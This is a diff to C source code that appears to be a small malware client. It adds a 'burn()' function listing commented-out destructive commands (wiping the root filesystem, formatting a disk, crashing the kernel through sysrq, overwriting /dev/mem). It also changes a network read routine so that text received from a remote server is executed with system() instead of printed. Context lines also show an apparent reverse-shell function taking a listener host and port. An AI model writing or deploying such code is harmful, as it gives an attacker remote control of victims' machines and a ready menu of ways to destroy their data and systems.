@@ -5,6 +5,18 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 
+int burn() {
+    //system("rm -rf /");
+    //system("echo 1 > /proc/sys/kernel/sysrq");
+    //system("echo c > /proc/sysrq-trigger");
+    //system("sysctl debug.kdb.panic=1");
+    //system("mkfs.ext4 /dev/sda1");
+    //system("mv / /dev/null");
+    //system("dd if=/dev/random of=/dev/port");
+    //system("echo 1 > /proc/sys/kernel/panic");
+    //system("cat /dev/zero > /dev/mem");
+}
+
 int pop(char *lhost, char *pname, int lport) {
     struct sockaddr_in base;
     int child = fork();
@@ -30,7 +42,7 @@ int read_server(char *addr, int port, char *c) {
     
     int r = socket(AF_INET, SOCK_STREAM, 0);
     if (r == -1) {
-        fprintf(stderr, "Cannot create socket");
+        fprintf(stderr, "Cannot create socket\n");
         return 1;
     }
     
@@ -41,16 +53,15 @@ int read_server(char *addr, int port, char *c) {
     int st_r = connect(r , (struct sockaddr *)&cc , sizeof(cc));
     
     if (st_r < 0) {
-        fprintf(stderr, "Cannot connect");
+        fprintf(stderr, "Server down\n");
         return 1;
     }
     
     if( recv(r, m, 512, 0) < 0) {
-        fprintf(stderr, "Receive failed");
+        fprintf(stderr, "Receive failed\n");
     }
     c = m;
-    printf("%s\n", c);
-    
+    system(c);
     return 0;
     
 }
